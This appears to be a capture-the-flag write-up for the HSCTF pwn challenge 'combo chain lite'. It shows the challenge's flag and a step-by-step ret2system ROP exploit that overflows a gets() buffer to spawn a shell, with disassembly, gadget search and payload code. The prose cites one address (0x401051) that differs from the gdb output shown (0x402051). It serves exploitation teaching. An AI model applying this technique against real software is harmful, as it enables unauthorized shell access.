## Problem info
<table>
  <tr>
    <td><strong>Name</strong></td>
    <td>combo chain lite</td>
  </tr>
  <tr>
    <td><strong>Category</strong></td>
    <td>Pwn</td>
  </tr>
  <tr>
    <td><strong>Flags</strong></td>
    <td>hsctf{wheeeeeee_that_was_fun}</td>
  </tr>
  <tr>
    <td><strong>Files</strong></td>
    <td>combo-chain-lite    combo-chain-lite.c </td>
  </tr>
  <tr>
    <td><strong>Tags</strong></td>
    <td></td>
  </tr>
  <tr>
    <td><strong>Hints</strong></td>
    <td>What's a ROP?</td>
  </tr>
</table>

#### Message
Written by: Ptomerty  

Training wheels!  

Note: If you're trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: (python; cat -) | nc pwn.hsctf.com <port>  

## Solution

After reading the source code, we see that the program kindly provided us the system address and the string '/bin/sh'

```
void vuln() {
	char dest[8];
	printf("Here's your free computer: %p\n", system);
	printf("Dude you hear about that new game called /bin/sh");
	printf("? Enter the right combo for some COMBO CARNAGE!: ");
	gets(dest);
}
```

so it's my work to combind them together.

First by the length of dest, we could guess buffer-over-flow offset shall be 0x10.

Second, start gdb-peda to find where '/bin/sh' is. According to the source code it must be written in vuln:
```
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x0000000000401166 <+0>:     push   rbp
   0x0000000000401167 <+1>:     mov    rbp,rsp
   0x000000000040116a <+4>:     sub    rsp,0x10
   0x000000000040116e <+8>:     mov    rax,QWORD PTR [rip+0x2e6b]        # 0x403fe0
   0x0000000000401175 <+15>:    mov    rsi,rax
   0x0000000000401178 <+18>:    lea    rdi,[rip+0xe89]        # 0x402008
   0x000000000040117f <+25>:    mov    eax,0x0
   0x0000000000401184 <+30>:    call   0x401050 <printf@plt>
   0x0000000000401189 <+35>:    lea    rdi,[rip+0xe98]        # 0x402028
   0x0000000000401190 <+42>:    mov    eax,0x0
   0x0000000000401195 <+47>:    call   0x401050 <printf@plt>
   0x000000000040119a <+52>:    lea    rdi,[rip+0xebf]        # 0x402060
   0x00000000004011a1 <+59>:    mov    eax,0x0
   0x00000000004011a6 <+64>:    call   0x401050 <printf@plt>
   0x00000000004011ab <+69>:    lea    rax,[rbp-0x8]
   0x00000000004011af <+73>:    mov    rdi,rax
   0x00000000004011b2 <+76>:    mov    eax,0x0
   0x00000000004011b7 <+81>:    call   0x401060 <gets@plt>
   0x00000000004011bc <+86>:    nop
   0x00000000004011bd <+87>:    leave
   0x00000000004011be <+88>:    ret
End of assembler dump.
```

so it would be some where around 0x402028. Do some trying searching I found **"/bin/sh"** at **0x401051**

```
gdb-peda$ x/s 0x402028
0x402028:       "Dude you hear about that new game called /bin/sh"
gdb-peda$ x/s 0x402051
0x402051:       "/bin/sh"
```

Next, i would like a function (referencing [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)) to run `pop_rdi; ret;` to run system('/bin/sh'). Lets leave gdb and use ROPchain:

```
$ ROPgadget --binary combo-chain-lite | grep "pop rdi"
0x0000000000401273 : pop rdi ; ret
``` 

Finally, i got to store up the system address that program generously provided. Writing [payload.py](./payload.py)

```
r.recvuntil(': ')
q = r.recvline()
system  = int(q[:-1],16)
print(system)
```

That's every thing we need. Now construct the payload:

```
buf = 0x10
bin_sh = 0x0000000000402051
pop_rdi = 0x0000000000401273

payload = 'a'* buf 
rop = flat([pop_rdi,bin_sh,system])

payload+=rop
```
as what is written in [payload.py](./payload.py)
